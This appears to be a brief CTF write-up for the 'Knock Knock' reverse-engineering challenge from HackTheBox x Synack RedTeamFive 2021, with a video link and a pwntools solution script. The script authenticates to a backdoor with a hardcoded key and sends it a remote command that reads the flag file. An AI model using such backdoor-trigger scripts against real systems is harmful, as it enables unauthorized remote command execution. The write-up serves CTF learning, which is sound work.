---
name: Knock Knock (2021)
event: HackTheBox x Synack RedTeamFive CTF 2021
category: Rev
description: Writeup for Knock Knock (rev) - HackTheBox x Synack RedTeamFive CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Knock Knock

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/TN1zPbKN_9E/0.jpg)](https://youtu.be/TN1zPbKN_9E?t=1070s "HackTheBox x Synack RedTeamFive 2021: Knock Knock")

## Solution

#### backdoor.py

{% code overflow="wrap" %}
```py
from pwn import *

context.log_level = 'DEBUG'

io = remote('ip', 31337)

cmd = b'command:cat flag.txt'

io.send(b'8f4328c40b1aa9409012c7406129f04b')
io.send(bytes([len(cmd)]))
io.send(cmd)

io.interactive()
```
{% endcode %}
